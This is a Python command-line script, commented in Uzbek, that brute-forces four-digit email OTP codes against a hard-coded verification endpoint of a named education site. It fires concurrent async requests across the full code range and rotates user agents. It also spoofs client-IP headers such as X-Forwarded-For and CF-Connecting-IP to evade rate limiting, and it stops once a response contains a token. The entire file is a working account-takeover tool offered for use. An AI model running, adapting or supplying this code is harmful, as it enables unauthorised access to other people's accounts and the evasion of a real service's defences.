import aiohttp
import asyncio
import argparse
import random
import time

# ==================== USER-AGENT RO'YXATI ====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

LANGUAGES = [
    "en-US,en;q=0.9", "en-GB,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8",
    "uz-UZ,uz;q=0.9,ru;q=0.8", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8", "ko-KR,ko;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8",
]

SEC_CH_UA_LIST = [
    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    '"Chromium";v="123", "Google Chrome";v="123", "Not-A.Brand";v="24"',
    '"Chromium";v="125", "Microsoft Edge";v="125", "Not-A.Brand";v="99"',
]


def tasodifiy_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def tasodifiy_headers():
    """Har bir so'rov uchun noyob headerlar"""
    ua = random.choice(USER_AGENTS)
    ip = tasodifiy_ip()

    headers = {
        "Content-Type": "application/json",
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": random.choice(LANGUAGES),
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "https://otaboyev-prep.uz",
        "Referer": "https://otaboyev-prep.uz/",
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "CF-Connecting-IP": ip,
        "True-Client-IP": ip,
        "X-Client-IP": ip,
    }

    if "Chrome" in ua or "Edg" in ua:
        headers["Sec-CH-UA"] = random.choice(SEC_CH_UA_LIST)
        headers["Sec-CH-UA-Mobile"] = "?0" if "Mobile" not in ua else "?1"
        headers["Sec-CH-UA-Platform"] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
        headers["Sec-Fetch-Dest"] = "empty"
        headers["Sec-Fetch-Mode"] = "cors"
        headers["Sec-Fetch-Site"] = "same-origin"

    return headers


# ==================== HISOBLAGICH ====================
class Hisoblagich:
    def __init__(self):
        self.yuborildi = 0
        self.muvaffaq = 0
        self.xato_429 = 0
        self.timeout = 0
        self.xato = 0
        self.topildi = False
        self.topilgan_parol = None
        self.lock = asyncio.Lock()
        self.boshlash_vaqti = time.time()

    async def oshir(self, tur):
        async with self.lock:
            self.yuborildi += 1
            if tur == "429": self.xato_429 += 1
            elif tur == "timeout": self.timeout += 1
            elif tur == "xato": self.xato += 1
            return self.yuborildi

    def tezlik(self):
        o_vaqt = time.time() - self.boshlash_vaqti
        if o_vaqt == 0: return 0
        return self.yuborildi / o_vaqt


# ==================== ASINXRON SO'ROV ====================
async def bitta_sorov(session, url, email, otp_code, jami, hisob, sem):
    """Bitta OTP kodni asinxron tekshirish"""

    if hisob.topildi:
        return None

    async with sem:  # Concurrency limitini saqlash
        if hisob.topildi:
            return None

        data = {"email": email, "otpCode": otp_code}
        headers = tasodifiy_headers()

        try:
            async with session.post(url, json=data, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as javob:
                status = javob.status
                javob_matni = await javob.text()

                joriy = await hisob.oshir("ok")

                # TOPILDI
                if status == 200 and "token" in javob_matni:
                    hisob.topildi = True
                    hisob.topilgan_parol = otp_code
                    tez = hisob.tezlik()
                    print(f"\n  {'*'*60}")
                    print(f"  *  OTP KOD TOPILDI!")
                    print(f"  *")
                    print(f"  *  Email    : {email}")
                    print(f"  *  OTP Code : {otp_code}")
                    print(f"  *  Status   : {status}")
                    print(f"  *  Urinish  : {joriy}/{jami}")
                    print(f"  *  Tezlik   : {tez:.0f} so'rov/sek")
                    print(f"  *  Vaqt     : {time.time() - hisob.boshlash_vaqti:.1f}s")
                    print(f"  *")
                    print(f"  *  Javob    : {javob_matni[:200]}")
                    print(f"  {'*'*60}\n")
                    return otp_code

                if status == 429:
                    joriy = await hisob.oshir("429")
                    # 429 bo'lsa biroz kutish
                    await asyncio.sleep(random.uniform(0.5, 1.5))

                # Har 100-chi so'rovda statistika
                if joriy % 100 == 0:
                    tez = hisob.tezlik()
                    qolgan = (jami - joriy) / tez if tez > 0 else 0
                    print(f"  [~] {joriy:>5}/{jami} | OTP: {otp_code} | {tez:.0f} so'rov/s | Qoldi: {qolgan:.0f}s | 429: {hisob.xato_429} | T/O: {hisob.timeout}")
                else:
                    print(f"  [-] {joriy:>5}/{jami} | OTP: {otp_code} | Status: {status}")

        except asyncio.TimeoutError:
            await hisob.oshir("timeout")
        except aiohttp.ClientError:
            await hisob.oshir("xato")
        except Exception:
            await hisob.oshir("xato")

    return None


async def otp_bruteforce(url, email, boshlanish, tugash, concurrency):
    """Asosiy asinxron bruteforce funksiyasi"""

    kodlar = [f"{i:04d}" for i in range(boshlanish, tugash + 1)]
    jami = len(kodlar)
    hisob = Hisoblagich()

    # Concurrency limiti (bir vaqtda nechta so'rov)
    sem = asyncio.Semaphore(concurrency)

    print(f"\n{'='*60}")
    print(f"  OTP BRUTEFORCE — ASYNC TURBO")
    print(f"{'='*60}")
    print(f"  URL         : {url}")
    print(f"  Email       : {email}")
    print(f"  Diapazon    : {kodlar[0]} — {kodlar[-1]}")
    print(f"  Jami        : {jami} ta kod")
    print(f"  Concurrency : {concurrency} ta parallel")
    print(f"  Timeout     : 5s (tez fail)")
    print(f"  Rejim       : aiohttp async (turbo)")
    print(f"{'='*60}\n")

    # TCP connector — ko'p ulanishni boshqaradi
    connector = aiohttp.TCPConnector(
        limit=concurrency,       # Umumiy ulanish limiti
        limit_per_host=concurrency,  # Bitta hostga limit
        ttl_dns_cache=300,       # DNS keshni saqlash
        enable_cleanup_closed=True,
    )

    async with aiohttp.ClientSession(connector=connector) as session:
        # BARCHA kodlarni bir vaqtda ishga tushirish
        tasks = [
            bitta_sorov(session, url, email, kod, jami, hisob, sem)
            for kod in kodlar
        ]

        # Natijalarni kutish
        results = await asyncio.gather(*tasks, return_exceptions=True)

    # Yakuniy statistika
    umumiy_vaqt = time.time() - hisob.boshlash_vaqti
    tez = hisob.yuborildi / umumiy_vaqt if umumiy_vaqt > 0 else 0

    print(f"\n{'='*60}")
    print(f"  YAKUNIY NATIJA")
    print(f"{'='*60}")
    print(f"  Yuborildi  : {hisob.yuborildi} ta")
    print(f"  Vaqt       : {umumiy_vaqt:.1f} soniya ({umumiy_vaqt/60:.1f} daqiqa)")
    print(f"  Tezlik     : {tez:.0f} so'rov/soniya")
    print(f"  429 xato   : {hisob.xato_429} ta")
    print(f"  Timeout    : {hisob.timeout} ta")
    if hisob.topilgan_parol:
        print(f"  TOPILDI    : {hisob.topilgan_parol}")
    else:
        print(f"  Topilmadi")
    print(f"{'='*60}\n")


def main():
    parser = argparse.ArgumentParser(
        description='OTP bruteforce — async turbo rejim',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Misol:
  python otp_turbo.py -e user@gmail.com
  python otp_turbo.py -e user@gmail.com -c 50
  python otp_turbo.py -e user@gmail.com -c 100 -b 1 -g 9999
        """
    )

    parser.add_argument('-e', '--email', required=True, help='Email manzil')
    parser.add_argument('-u', '--url', default='https://api.otaboyev-prep.uz/auth/verify-email', help='API URL')
    parser.add_argument('-b', '--boshlanish', type=int, default=1, help='Boshlang\'ich kod (standart: 1)')
    parser.add_argument('-g', '--tugash', type=int, default=10000, help='Oxirgi kod (standart: 10000)')
    parser.add_argument('-c', '--concurrency', type=int, default=50, help='Bir vaqtda nechta so\'rov (standart: 50)')

    args = parser.parse_args()

    asyncio.run(otp_bruteforce(args.url, args.email, args.boshlanish, args.tugash, args.concurrency))


if __name__ == '__main__':
    main()
